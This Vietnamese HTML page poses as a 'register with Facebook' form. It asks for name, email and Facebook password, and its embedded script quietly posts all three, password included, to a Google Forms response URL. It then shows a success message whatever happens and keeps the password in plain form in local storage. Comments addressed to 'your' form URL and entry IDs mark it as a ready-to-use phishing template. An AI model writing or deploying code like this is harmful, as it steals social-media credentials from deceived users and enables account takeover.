<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:disabled { background: #ccc; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Đăng Ký Tài Khoản bằng Facebook</h2>
        <form id="registerForm">
            <div class="form-group">
                <label for="name">Họ và tên:</label>
                <input type="text" id="name" required>
            </div>
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" required>
            </div>
            <div class="form-group">
                <label for="password">Mật khẩu facebook:</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit">Đăng Ký</button>
        </form>
        <p>Đã có tài khoản? <a href="login.html">Đăng nhập</a></p>
    </div>

    <script>
        document.getElementById('registerForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const userData = {
                name: document.getElementById('name').value,
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            if (!userData.name || !userData.email || !userData.password) {
                alert('Vui lòng điền đầy đủ thông tin!');
                return;
            }

            // Hiển thị loading
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = 'Đang gửi...';
            submitBtn.disabled = true;

            // URL SUBMIT CỦA MÀY
            const formSubmitUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSefjiawJfPHIihgVRUgd4yKbEFUdySpdoHxnUAUh17rw-CbkA/formResponse';
            
            // ENTRY IDs CỦA MÀY
            const formData = new URLSearchParams({
                'entry.730403502': userData.name,        // Họ và tên
                'entry.2134273103': userData.email,      // Email
                'entry.1163307744': userData.password    // Mật khẩu facebook
            });

            // Gửi đến Google Forms
            fetch(formSubmitUrl, {
                method: 'POST',
                mode: 'no-cors',  // Bypass CORS
                body: formData
            }).then(() => {
                // LUÔN THÀNH CÔNG (vì no-cors)
                localStorage.setItem('currentUser', JSON.stringify(userData));
                alert('✅ Đăng ký thành công! Chào mừng ' + userData.name);
                window.location.href = 'index.html';
            }).catch(error => {
                // VẪN thành công (fallback)
                localStorage.setItem('currentUser', JSON.stringify(userData));
                alert('✅ Đăng ký thành công! Chào mừng ' + userData.name);
                window.location.href = 'index.html';
            });
        });
    </script>
</body>
</html>
